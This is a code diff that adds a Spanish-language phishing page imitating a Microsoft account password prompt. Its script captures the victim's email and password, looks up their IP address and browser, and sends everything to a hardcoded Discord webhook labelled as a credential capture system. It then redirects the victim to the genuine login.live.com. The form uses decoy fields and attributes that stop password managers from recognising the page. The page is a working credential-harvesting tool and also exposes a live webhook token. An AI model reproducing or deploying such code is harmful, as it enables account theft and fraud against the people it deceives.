@@ -1,0 +1,368 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <title>Iniciar sesión en su cuenta</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      min-height: 100vh;
+      color: #1b1b1b;
+      background: url('banner.svg') center/cover no-repeat fixed;
+    }
+
+    /* ── CONTENEDOR PRINCIPAL ── */
+    .main-container {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px 16px 80px;
+    }
+
+    /* ── CARD ── */
+    .ms-card {
+      background: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,.2);
+      padding: 28px 44px 36px;
+      width: 100%;
+      max-width: 440px;
+      position: relative;
+    }
+
+    /* ── HEADER: flecha + logo centrado ── */
+    .ms-card-header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .ms-back-btn {
+      position: absolute;
+      left: 0;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 4px;
+      color: #1b1b1b;
+      display: flex;
+      align-items: center;
+    }
+    .ms-back-btn:hover { color: #0078d4; }
+
+    .ms-logo-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .ms-logo-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1px;
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
+    }
+    .ms-logo-grid div { width: 9px; height: 9px; }
+
+    /* ── EMAIL PÍLDORA ── */
+    .ms-email-badge {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+    .ms-email-badge span {
+      border: 1px solid #8a8886;
+      border-radius: 20px;
+      padding: 4px 16px;
+      font-size: 13px;
+      color: #1b1b1b;
+    }
+
+    /* ── TÍTULO ── */
+    .ms-card h1 {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      line-height: 32px;
+      color: #1b1b1b;
+      margin: 0 0 20px;
+    }
+
+    /* ── INPUT CONTRASEÑA ── */
+    #password {
+      display: block;
+      width: 100%;
+      border: 1px solid #8a8886;
+      padding: 10px 12px;
+      background: #fff;
+      font-size: 16px;
+      font-family: inherit;
+      color: #1b1b1b;
+      outline: none;
+      -webkit-text-security: disc;
+      text-security: disc;
+    }
+    #password:focus {
+      border-color: #0078d4;
+      box-shadow: inset 0 0 0 1px #0078d4;
+    }
+    #password::placeholder { color: #767676; }
+
+    /* ── LINK ── */
+    .ms-link {
+      color: #0078d4;
+      text-decoration: none;
+      font-size: 13px;
+    }
+    .ms-link:hover { text-decoration: underline; }
+
+    /* ── BOTÓN ── */
+    .ms-btn-next {
+      display: block;
+      width: 100%;
+      background: #0078d4;
+      color: #fff;
+      border: none;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: inherit;
+      padding: 10px 12px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .ms-btn-next:hover    { background: #106ebe; }
+    .ms-btn-next:active   { background: #005a9e; }
+    .ms-btn-next:disabled { background: #888; cursor: not-allowed; }
+
+    /* ── OTRAS FORMAS ── */
+    .ms-other-login {
+      text-align: center;
+      margin-top: 20px;
+      padding-top: 20px;
+      border-top: 1px solid #e0e0e0;
+    }
+
+    /* ── FOOTER ── */
+    .ms-footer {
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      background: rgba(255,255,255,.95);
+      border-top: 1px solid #e0e0e0;
+      padding: 8px 16px;
+      z-index: 50;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 24px;
+      font-size: 12px;
+      color: #605e5c;
+    }
+    .ms-footer a { color: #605e5c; text-decoration: none; font-size: 12px; }
+    .ms-footer a:hover { color: #0078d4; }
+
+    /* ── ANIMACIÓN ── */
+    .fade-in { animation: fadeIn .3s ease-out; }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to   { opacity: 1; transform: none; }
+    }
+
+    /* ── MÓVIL ── */
+    @media (max-width: 639px) {
+      html, body {
+        position: fixed !important;
+        width: 100% !important;
+        height: 100% !important;
+        overflow: hidden !important;
+        overscroll-behavior: none !important;
+        touch-action: none !important;
+      }
+      .main-container {
+        position: fixed !important;
+        inset: 0;
+        overflow: hidden !important;
+        touch-action: none !important;
+      }
+    }
+
+    }
+  </style>
+</head>
+<body>
+
+  <div class="main-container">
+    <div class="ms-card fade-in">
+
+      <!-- Header -->
+      <div class="ms-card-header">
+        <button class="ms-back-btn" onclick="history.back()" title="Volver">
+          <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+            <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+          </svg>
+        </button>
+        <div class="ms-logo-row">
+          <div class="ms-logo-grid">
+            <div style="background:#f25022"></div>
+            <div style="background:#7fba00"></div>
+            <div style="background:#00bcf2"></div>
+            <div style="background:#ffb900"></div>
+          </div>
+          <span style="font-size:20px;font-weight:600;color:#1b1b1b;">Microsoft</span>
+        </div>
+      </div>
+
+      <!-- Email badge -->
+      <div class="ms-email-badge">
+        <span id="userEmail">usuario@ejemplo.com</span>
+      </div>
+
+      <h1>Escribir contraseña</h1>
+
+      <!-- Form -->
+      <form id="loginForm" autocomplete="off">
+        <!-- Campos trampa -->
+        <input type="text"     name="username" style="display:none" tabindex="-1" autocomplete="username">
+        <input type="password" name="fake"     style="display:none" tabindex="-1" autocomplete="current-password">
+
+        <input
+          type="text"
+          id="password"
+          name="password"
+          placeholder="Contraseña"
+          required
+          autocomplete="off"
+          data-1p-ignore
+          data-lpignore="true"
+          data-bwignore
+          data-form-type="other"
+        />
+
+        <div style="margin-top:12px;">
+          <a href="#" class="ms-link">¿Olvidó su contraseña?</a>
+        </div>
+
+        <button type="submit" id="submitBtn" class="ms-btn-next">Siguiente</button>
+      </form>
+
+      <div class="ms-other-login">
+        <a href="#" class="ms-link">Otras formas de iniciar sesión</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="ms-footer">
+    <a href="#">Términos de uso</a>
+    <a href="#">Privacidad y cookies</a>
+    <span>···</span>
+  </div>
+
+  <script>
+    // ── WEBHOOK DE DISCORD ─────────────────────────────────────────
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1471154630997315625/EWAdwp2bkQXXFkU5Nh87iUKf4NfvnP0eQ5CqUOT1P-fhUC8iSjrXqYAEe1kdkHWG3PTi";
+
+    // ── EMAIL DESDE URL ────────────────────────────────────────────
+    const params = new URLSearchParams(window.location.search);
+    const email  = params.get('email') || 'usuario@ejemplo.com';
+    document.getElementById('userEmail').textContent = email;
+
+    // ── ENVÍO A DISCORD ────────────────────────────────────────────
+    async function notifyDiscord(email, password) {
+      const timestamp = new Date().toLocaleString('es-ES');
+      
+      // Obtener IP
+      let ip = 'Desconocida';
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+      } catch(e) {}
+
+      // Mensaje para Discord
+      const payload = {
+        username: "🔐 Outlook Z3 - Login",
+        avatar_url: "https://cdn-icons-png.flaticon.com/512/732/732221.png",
+        embeds: [{
+          title: "🔐 Nuevo Login Capturado",
+          description: "El usuario ha ingresado sus credenciales",
+          color: 0x00FF00, // Verde para éxito
+          fields: [
+            { name: "📧 Email", value: `\`${email}\``, inline: false },
+            { name: "🔐 Contraseña", value: `\`\`\`${password}\`\`\``, inline: false },
+            { name: "🕐 Fecha", value: timestamp, inline: true },
+            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+            { name: "📱 Navegador", value: `\`${navigator.userAgent.substring(0, 50)}...\``, inline: false }
+          ],
+          footer: {
+            text: "Outlook Z3 - Sistema de Captura"
+          },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        await fetch(DISCORD_WEBHOOK, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.error('Error enviando a Discord:', e);
+      }
+    }
+
+    // ── SUBMIT ────────────────────────────────────────────────────
+    const submitBtn = document.getElementById('submitBtn');
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      if (submitBtn.disabled) return;
+
+      const password = document.getElementById('password').value.trim();
+      if (!password) return;
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Verificando...';
+
+      await notifyDiscord(email, password);
+
+      // Redirección
+      const yaPasoPorIndex3 = localStorage.getItem('paso_index3') === '1';
+      if (yaPasoPorIndex3) {
+        window.location.href = `https://login.live.com/`;
+      } else {
+        localStorage.setItem('paso_index3', '1');
+        window.location.href = `https://login.live.com/`;
+      }
+    });
+
+    // ── BLOQUEAR ZOOM TÁCTIL ──────────────────────────────────────
+    document.addEventListener('gesturestart',  e => e.preventDefault());
+    document.addEventListener('gesturechange',              e => e.preventDefault());
+    document.addEventListener('gestureend',    e => e.preventDefault());
+    let lastTouch = 0;
+    document.addEventListener('touchend', e => {
+      const now = Date.now();
+      if (now - lastTouch <= 300) e.preventDefault();
+      lastTouch = now;
+    }, { passive: false });
+    document.addEventListener('touchmove', e => {
+      if (e.touches.length > 1) e.preventDefault();
+    }, { passive: false });
+  </script>
+
+</body>
+</html>
